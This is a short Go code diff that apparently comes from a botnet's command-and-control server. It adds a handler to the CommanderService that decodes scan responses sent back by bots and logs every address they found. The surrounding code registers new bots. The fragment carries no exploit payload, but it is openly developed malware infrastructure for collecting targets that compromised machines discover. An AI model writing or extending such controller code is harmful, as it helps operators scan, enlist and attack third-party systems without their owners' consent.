@@ -36,3 +36,18 @@ func (c *CommanderService) HandleGenesis(payload []byte) {
 	}
 	botnet.Msg("bot was added")
 }
+
+//HandleScanResponse is
+func (c *CommanderService) HandleScanResponse(payload []byte) {
+	req := new(scanResponse)
+	if err := gob.NewDecoder(bytes.NewReader(payload)).Decode(req); err != nil {
+		log.Panic(err)
+	}
+
+	botnet.Msg("recevied scan response. addrs found", len(req.Addrs))
+
+	// save to db or figure out what to do with this later
+	for _, addr := range req.Addrs {
+		botnet.Msg("addr found", addr)
+	}
+}
